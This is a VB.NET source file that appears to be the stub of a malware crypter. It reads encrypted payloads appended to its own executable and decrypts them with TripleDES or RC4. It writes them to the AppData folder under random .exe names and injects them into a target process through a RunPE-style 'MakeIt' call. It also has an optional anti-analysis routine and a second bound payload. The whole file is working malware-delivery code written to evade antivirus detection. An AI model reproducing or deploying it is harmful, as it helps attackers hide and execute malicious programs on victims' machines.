Imports System.Windows.Forms
Imports System.Text

Module Mymod
    Dim res As String
    Dim thepath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\"

    Public Function RandomNumber(ByVal min As Integer, ByVal max As Integer) As Integer
        Dim random As New Random()
        Return random.Next(min, max)
    End Function

    Public Function RandomString(ByVal size As Integer, ByVal lowerCase As Boolean) As String
        Dim builder As New StringBuilder()
        Dim random As New Random()
        Dim ch As Char
        Dim i As Integer
        For i = 0 To size - 1
            ch = Convert.ToChar(Convert.ToInt32((26 * random.NextDouble() + 65)))
            builder.Append(ch)
        Next i
        If lowerCase Then
            Return builder.ToString().ToLower()
        End If
        Return builder.ToString()
    End Function

    Public Function GetRandom() As String
        Dim builder As New StringBuilder()
        builder.Append(RandomString(4, True))
        builder.Append(RandomNumber(1000, 9999))
        builder.Append(RandomString(2, False))
        Return builder.ToString()
    End Function

    Sub Main()
        Dim Cuttkey As String = "/Assembly/"
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        res = Space(LOF(1))
        FileGet(1, res)
        FileClose(1)

        Dim Cutter() As String
        Cutter = Split(res, Cuttkey)

        Dim exerandname As String = GetRandom.ToString + ".exe"
        Dim key As String = Cutter(2)
        Dim entype As String = Cutter(3)
        Dim antyw As String = Cutter(4)
        Dim processZ As String = Cutter(5)
        If processZ = "own" Then
            processZ = Process.GetCurrentProcess().MainModule.FileName
        End If

        If antyw = "true" Then
            ant.mofo()
        End If

        If Cutter(6) = "yes" Then
            If entype = "tripleDES" Then
                FileOpen(1, thepath + "a" + exerandname, OpenMode.Binary)
                FilePut(1, _3des.a(Cutter(7), key, True))
                FileClose(1)
            ElseIf entype = "rc4" Then
                FileOpen(1, thepath + "a" + exerandname, OpenMode.Binary)
                FilePut(1, _4cr.enc(Cutter(7), key))
                FileClose(1)
            End If
            Dim oFile1 As System.IO.FileInfo
            oFile1 = New System.IO.FileInfo(thepath + "a" + exerandname)

            Dim oFileStream1 As System.IO.FileStream = oFile1.OpenRead()
            Dim lBytes1 As Long = oFileStream1.Length

            If (lBytes1 > 0) Then
                Dim fileData(lBytes1 - 1) As Byte
                oFileStream1.Read(fileData, 0, lBytes1)
                rp.MakeIt(fileData, processZ)
                oFileStream1.Close()
            End If
        End If

        If entype = "tripleDES" Then
            FileOpen(1, thepath + exerandname, OpenMode.Binary)
            FilePut(1, _3des.a(Cutter(1), key, True))
            FileClose(1)
        ElseIf entype = "rc4" Then
            FileOpen(1, thepath + exerandname, OpenMode.Binary)
            FilePut(1, _4cr.enc(Cutter(1), key))
            FileClose(1)
        End If

        Dim oFile As System.IO.FileInfo
        oFile = New System.IO.FileInfo(thepath + exerandname)

        Dim oFileStream As System.IO.FileStream = oFile.OpenRead()
        Dim lBytes As Long = oFileStream.Length

        If (lBytes > 0) Then
            Dim fileData(lBytes - 1) As Byte
            oFileStream.Read(fileData, 0, lBytes)
            rp.MakeIt(fileData, processZ)
            oFileStream.Close()
        End If
        End
    End Sub
End Module
